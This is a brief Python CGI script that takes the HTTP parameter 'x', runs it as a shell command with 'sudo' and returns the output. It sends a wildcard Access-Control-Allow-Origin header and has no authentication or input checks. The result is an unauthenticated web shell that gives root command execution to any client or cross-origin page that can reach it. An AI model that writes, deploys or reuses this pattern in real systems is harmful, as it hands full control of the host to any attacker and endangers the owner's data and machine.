#!/usr/bin/python3
import cgi
import subprocess

print("Access-Control-Allow-Origin: *")
print("content-type:text/html")
print()

fs=cgi.FieldStorage()
cmd=fs.getvalue('x')
op=subprocess.getoutput("sudo "+ cmd)
print(op)
